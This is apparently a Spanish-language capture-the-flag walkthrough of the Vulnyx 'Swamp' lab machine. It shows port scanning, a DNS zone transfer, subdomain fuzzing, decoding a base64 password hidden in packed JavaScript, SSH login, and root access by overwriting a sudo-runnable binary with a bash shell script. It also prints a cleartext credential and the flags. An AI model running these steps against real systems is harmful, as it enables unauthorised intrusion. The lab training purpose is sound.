---
icon: flag
---

# Swamp Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 03:09 EDT
Nmap scan report for 192.168.5.89
Host is up (0.00099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-1~deb12u2 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-1~deb12u2-Debian
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Did not follow redirect to http://swamp.nyx
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:6E:84:6B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.16 seconds
```

Veremos varias cosas interesantes, entre ellas el puerto `80` y el puerto `53` (`DNS`), primero vamos a ver el puerto `80` a ver que vemos, entrando dentro del mismo veremos que nos intenta cargar un `dominio` llamado `swamp.nyx`, por lo que vamos a meterlo en el archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano

<IP>              swamp.nyx
```

Una vez guardado, volveremos a entrar en el puerto `80` y nos cargara una pagina con una imagen simplemente sin nada mas, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## DNS

Si realizamos un escaneo de `DNS` para ver que encontramos respecto al `dominio` veremos varios nombres que podrian servir para un `subdominio`, por lo que vamos a crear una lista con dichos `subdominios`.

```shell
dig axfr swamp.nyx @<IP>
```

Info:

```
; <<>> DiG 9.20.4-4-Debian <<>> axfr swamp.nyx @192.168.5.89
;; global options: +cmd
swamp.nyx.              604800  IN      SOA     ns1.swamp.nyx. . 2025010401 604800 86400 2419200 604800
swamp.nyx.              604800  IN      NS      ns1.swamp.nyx.
d0nkey.swamp.nyx.       604800  IN      A       0.0.0.0
dr4gon.swamp.nyx.       604800  IN      A       0.0.0.0
duloc.swamp.nyx.        604800  IN      A       0.0.0.0
f1ona.swamp.nyx.        604800  IN      A       0.0.0.0
farfaraway.swamp.nyx.   604800  IN      A       0.0.0.0
ns1.swamp.nyx.          604800  IN      A       0.0.0.0
shr3k.swamp.nyx.        604800  IN      A       0.0.0.0
swamp.nyx.              604800  IN      SOA     ns1.swamp.nyx. . 2025010401 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.5.89#53(192.168.5.89) (TCP)
;; WHEN: Tue Aug 26 03:22:49 EDT 2025
;; XFR size: 10 records (messages 1, bytes 309)
```

Ahora vamos a realizar un `fuzzing` con dicha lista:

> subdomains.txt

```
d0nkey
dr4gon
duloc
f1ona
farfaraway
ns1
shr3k
```

## FFUF

```shell
ffuf -c -t 200 -w subdomains.txt -H "Host: FUZZ.swamp.nyx" -u http://swamp.nyx/ -fs 0
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://swamp.nyx/
 :: Wordlist         : FUZZ: /home/kali/Desktop/swamp/subdomains.txt
 :: Header           : Host: FUZZ.swamp.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

farfaraway              [Status: 200, Size: 557, Words: 145, Lines: 25, Duration: 15ms]
f1ona                   [Status: 200, Size: 497, Words: 140, Lines: 25, Duration: 15ms]
duloc                   [Status: 200, Size: 508, Words: 142, Lines: 25, Duration: 17ms]
d0nkey                  [Status: 200, Size: 594, Words: 187, Lines: 31, Duration: 17ms]
shr3k                   [Status: 200, Size: 4809, Words: 1961, Lines: 138, Duration: 17ms]
dr4gon                  [Status: 200, Size: 498, Words: 140, Lines: 24, Duration: 19ms]
:: Progress: [7/7] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Veremos que funciona todos, por lo que vamos añadirlos en el archivo `hosts` para entrar en cada uno de ellos a ver que vemos.

```shell
nano /etc/hosts

#Dentro del nano

<IP>            swamp.nyx d0nkey.swamp.nyx dr4gon.swamp.nyx duloc.swamp.nyx f1ona.swamp.nyx farfaraway.swamp.nyx ns1.swamp.nyx shr3k.swamp.nyx
```

Lo guardamos y probamos a entrar en cada uno de ellos a ver que vemos interesante, si entramos en el `subdominio` llamado `farfaraway.swamp.nyx` veremos en el codigo fuente un `script` que en los demas no esta.

## Escalate user shrek

```html
<script src="script.min.js"></script>
```

Entrando dentro del codigo de `JavaScript` veremos un codigo `ofuscado` de tipo `packet` por lo que vamos a decodificarlo.

```js
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('!M(){1C e;9 1D((e,t)=>{11(()=>{e("1y z 1z: 5")},1L)}).1I(e=>{6.7(e)}).1j(e=>{6.F(e)});8 t=1G e=>{1M{8 t=1g(1g 1l(e)).1p();6.7("1q 1l 2c:",t)}1j(o){6.F("1k 27 1d:",o)}};t("2d://2k.2h.2f/2g"),(()=>{8 e=k.26("1S");e.1T="1P 1V 22 R J 23",k.2b.1X(e)})();1W o{1Y(e,t){B.j=e,B.Q=t}C(){6.7(`${B.j}1Z:${B.Q}`)}}8 a=9 o("1O","1Q"),l=9 o("1R","24");a.C(),l.C();8 r=[1,2,3,4,5],n=r.2i(e=>2*e);6.7("2j 17:",n);8 s=r.2e((e,t)=>e+t,0);6.7("28 1i 17:",s);6.7("29 q:",{j:"T",b:30,2a:"1N"}),2l(()=>{6.7("12 1H 1r 1s 2 Z")},1t),k.1u("1v",()=>{6.7("1m 1o 1n J k")});8 g=9 14;6.7("1w W:",g.Y());8 i=9 14(g.1J()+1,g.1K(),g.1F());6.7("1E W:",i.Y());8 c=e=>{e%2==0?6.7(e+" z 1x"):6.7(e+" z 1A")};[10,21,32,1B,1U].V(c),11(()=>{6.7("12 2V 2W 3 Z")},2X);(e=>{8 t=e(10,20);6.7("2N 1c 2P-2R M:",t)})((e,t)=>e+t);8{X:d,13:u,b:h}={X:"31",13:"33",b:25};6.7(`2m:${d}${u},36:${h}`);8 m=9 19;m.N("j","G"),m.N("b",30),m.N("K","1b 1b 37"),6.7("19 15:"),m.V((e,t)=>{6.7(t+": "+e)});8 p=9 18([1,2,3,4,4,5]);6.7("18 15 (2u 2v):",2x.1c(p));8 $=M*e(){E"2s D",E"2p D",E"2q D"}();6.7($.H().A),6.7($.H().A),6.7($.H().A);6.7("2r, T! 2H R J 2I.");2K:2G;8 f=x.1h(\'{"j":"G","b":30}\');6.7("2F x 1d:",f),"O"1e U?U.O.2B(e=>{6.7("2A 2C K:",e.P.2D,e.P.2E)},e=>{6.F("1k 2L K:",e)}):6.7("2J 2z 2y");8 v="    2n z 2o!   ",y=v.2t();6.7("2w 1f:",y);8 S=v.2M();6.7("2Z 1f:",S),I.35("q",x.34({j:"G",b:30}));8 w=x.1h(I.38("q"));6.7("39 q 1e I:",w),6.7("2Q 2O:",L.2S()),6.7("2T 2Y 1i 16:",L.2U(16)),6.7("1a A:",L.1a)}();',62,196,'||||||console|log|let|new||age||||||||name|document||||||user|||||||JSON||is|value|this|speak|part|yield|error|Shrek|next|localStorage|the|location|Math|function|set|geolocation|coords|sound|to||John|navigator|forEach|date|firstName|toString|seconds||setTimeout|This|lastName|Date|values||numbers|Set|Map|PI|Far|from|data|in|string|await|parse|of|catch|Error|fetch|Click|on|detected|json|Data|repeats|every|2e3|addEventListener|click|Current|even|Value|positive|odd|43|var|Promise|Future|getDate|async|message|then|getFullYear|getMonth|1e3|try|USA|Dog|Dynamically|Woof|Cat|div|innerHTML|54|added|class|appendChild|constructor|says|||text|DOM|Meow||createElement|fetching|Sum|Updated|country|body|success|https|reduce|com|posts|typicode|map|Doubled|jsonplaceholder|setInterval|Destructuring|JavaScript|fun|Second|Third|Hello|First|trim|no|duplicates|Trimmed|Array|available|not|Your|getCurrentPosition|current|latitude|longitude|Parsed|c2hyZWs6cHV0b3Blc2FvZWxhc25v|Welcome|page|Geolocation|Password|getting|toUpperCase|Result|number|higher|Random|order|random|Square|sqrt|runs|after|3e3|root|Uppercase||Jane||Doe|stringify|setItem|Age|Away|getItem|Stored'.split('|'),0,{}))
```

Ahora si lo decodificamos lo veremos de esta forma:

```js
!function()
	{
	var e;
	new Promise((e,t)=>
		{
		setTimeout(()=>
			{
			e("Value is positive: 5")
		}
		,1e3)
	}
	).then(e=>
		{
		console.log(e)
	}
	).catch(e=>
		{
		console.error(e)
	}
	);
	let t=async e=>
		{
		try
			{
			let t=await(await fetch(e)).json();
			console.log("Data fetch success:",t)
		}
		catch(o)
			{
			console.error("Error fetching data:",o)
		}
	};
	t("https://jsonplaceholder.typicode.com/posts"),(()=>
		{
		let e=document.createElement("div");
		e.innerHTML="Dynamically added text to the DOM",document.body.appendChild(e)
	}
	)();
	class o
		{
		constructor(e,t)
			{
			this.name=e,this.sound=t
		}
		speak()
			{
			console.log(`$
				{
				this.name
			}
			says:$
				{
				this.sound
			}
			`)
		}
	}
	let a=new o("Dog","Woof"),l=new o("Cat","Meow");
	a.speak(),l.speak();
	let r=[1,2,3,4,5],n=r.map(e=>2*e);
	console.log("Doubled numbers:",n);
	let s=r.reduce((e,t)=>e+t,0);
	console.log("Sum of numbers:",s);
	console.log("Updated user:",
		{
		name:"John",age:30,country:"USA"
	}
	),setInterval(()=>
		{
		console.log("This message repeats every 2 seconds")
	}
	,2e3),document.addEventListener("click",()=>
		{
		console.log("Click detected on the document")
	}
	);
	let g=new Date;
	console.log("Current date:",g.toString());
	let i=new Date(g.getFullYear()+1,g.getMonth(),g.getDate());
	console.log("Future date:",i.toString());
	let c=e=>
		{
		e%2==0?console.log(e+" is even"):console.log(e+" is odd")
	};
	[10,21,32,43,54].forEach(c),setTimeout(()=>
		{
		console.log("This runs after 3 seconds")
	}
	,3e3);
	(e=>
		{
		let t=e(10,20);
		console.log("Result from higher-order function:",t)
	}
	)((e,t)=>e+t);
	let
		{
		firstName:d,lastName:u,age:h
	}
	=
		{
		firstName:"Jane",lastName:"Doe",age:25
	};
	console.log(`Destructuring:$
		{
		d
	}
	$
		{
		u
	}
	,Age:$
		{
		h
	}
	`);
	let m=new Map;
	m.set("name","Shrek"),m.set("age",30),m.set("location","Far Far Away"),console.log("Map values:"),m.forEach((e,t)=>
		{
		console.log(t+": "+e)
	}
	);
	let p=new Set([1,2,3,4,4,5]);
	console.log("Set values (no duplicates):",Array.from(p));
	let $=function*e()
		{
		yield"First part",yield"Second part",yield"Third part"
	}
	();
	console.log($.next().value),console.log($.next().value),console.log($.next().value);
	console.log("Hello, John! Welcome to the page.");
	Password:c2hyZWs6cHV0b3Blc2FvZWxhc25v;
	let f=JSON.parse('
		{
		"name":"Shrek","age":30
	}
	');
	console.log("Parsed JSON data:",f),"geolocation"in navigator?navigator.geolocation.getCurrentPosition(e=>
		{
		console.log("Your current location:",e.coords.latitude,e.coords.longitude)
	}
	,e=>
		{
		console.error("Error getting location:",e)
	}
	):console.log("Geolocation not available");
	let v="    JavaScript is fun!   ",y=v.trim();
	console.log("Trimmed string:",y);
	let S=v.toUpperCase();
	console.log("Uppercase string:",S),localStorage.setItem("user",JSON.stringify(
		{
		name:"Shrek",age:30
	}
	));
	let w=JSON.parse(localStorage.getItem("user"));
	console.log("Stored user in localStorage:",w),console.log("Random number:",Math.random()),console.log("Square root of 16:",Math.sqrt(16)),console.log("PI value:",Math.PI)
}
();
```

Veremos estas lineas interesantes:

```
console.log("Hello, John! Welcome to the page.");
	Password:c2hyZWs6cHV0b3Blc2FvZWxhc25v;
	let f=JSON.parse('
		{
		"name":"Shrek","age":30
	}
```

Si decodificamos ese `Base64` veremos esto:

```shell
echo 'c2hyZWs6cHV0b3Blc2FvZWxhc25v' | base64 -d
```

Info:

```
shrek:putopesaoelasno
```

Vamos a probar dichas credenciales por `SSH` a ver que vemos.

### SSH

```shell
ssh shrek@<IP>
```

Metemos como contraseña `putopesaoelasno`...

```
Linux swamp 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 13:12:39 2025 from 192.168.1.33
shrek@swamp:~$ whoami
shrek
```

Veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
7d199d72f12135ef193ad19faf9468ef
```

## Escalate Privileges

Si listamos los permisos `SUID` que hay en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1048992    640 -rwsr-xr-x   1 root     root       653888 Jun 22  2024 /usr/lib/openssh/ssh-keysign
  1062369     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1046487     36 -rwsr-xr-x   1 root     root          35128 Oct 18  2024 /usr/bin/umount
  1047858     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
  1050027     84 -rwsrwxrwx   1 root     root          85376 Sep 14  2022 /usr/bin/mt-gnu
  1044597     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
  1044577     72 -rwsr-xr-x   1 root     root          72000 Oct 18  2024 /usr/bin/su
  1046483     60 -rwsr-xr-x   1 root     root          59704 Oct 18  2024 /usr/bin/mount
  1044593     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
  1074722    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo
  1044596     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
  1061091     36 -rwsr-xr-x   1 root     root          35128 Apr 18  2023 /usr/bin/fusermount3
  1044594     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
   913960     20 -rwsrwxrwx   1 root     root          17736 Jan  4  2025 /home/shrek/header_checker
```

Veremos esta linea interesante:

```
913960  20 -rwsrwxrwx   1 root  root  17736 Jan  4  2025 /home/shrek/header_checker
```

Si listamos dicho archivo veremos lo siguiente:

```
-rwsrwxrwx 1 root  root  17736 Jan  4  2025 header_checker
```

Pero si a demas hacemos `sudo -l` veremos esto otro:

```
Matching Defaults entries for shrek on swamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shrek may run the following commands on swamp:
    (ALL) NOPASSWD: /home/shrek/header_checker
```

Podemos ejecutar el binario `header_checker` como el usuario `root`, por lo que podremos realizar lo siguiente:

Vamos a limpiar el binario de esta forma:

```shell
echo '' > /home/shrek/header_checker
```

Ahora vamos a meter la siguiente informacion:

```shell
#!/bin/bash 

/bin/bash
```

Lo guardamos y ejecutaremos de esta forma:

```shell
sudo /home/shrek/header_checker
```

Info:

```
root@swamp:/home/shrek# whoami
root
```

Vemos que con esto seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
9c7bddee2e2fb8ad03854f106f23c6b5
```
